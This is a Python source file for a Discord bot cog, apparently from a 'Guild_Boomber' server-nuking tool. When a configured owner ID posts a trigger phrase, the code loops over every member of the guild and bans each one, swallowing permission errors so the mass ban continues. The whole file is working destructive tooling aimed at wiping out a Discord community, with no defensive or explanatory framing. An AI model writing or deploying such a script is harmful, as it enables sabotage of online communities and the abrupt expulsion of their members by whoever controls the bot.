import discord
from discord.ext import commands
import json

config = json.loads(open('config/set.json', 'r', encoding='utf-8').read())

intents=intents=discord.Intents.all()
intents = discord.Intents()
intents.members = True

intents = discord.Intents(messages=True, guilds=True, reactions=True, members=True)


banclient = commands.Bot(command_prefix='.', intents = intents)

class allban(commands.Cog):
    def __init__(self, client):
        self.client = client

    #Ban users
    @commands.Cog.listener()
    async def on_message(self,message):
        if message.author.id == int(config["sizinid"]):
            if config["names"]["patlatmamesajı"] in message.content:
                for user in list(message.guild.members):
                    try:
                        if config["required"]["herkesibanla"]:
                            await user.ban(reason="https://github.com/CryonicsX/Guild_Boomber")
                    except discord.Forbidden:
                        continue
                    except Exception as e:
                        #print("hata : {}".format(e))
                        continue

def setup(client):
    client.add_cog(allban(client))
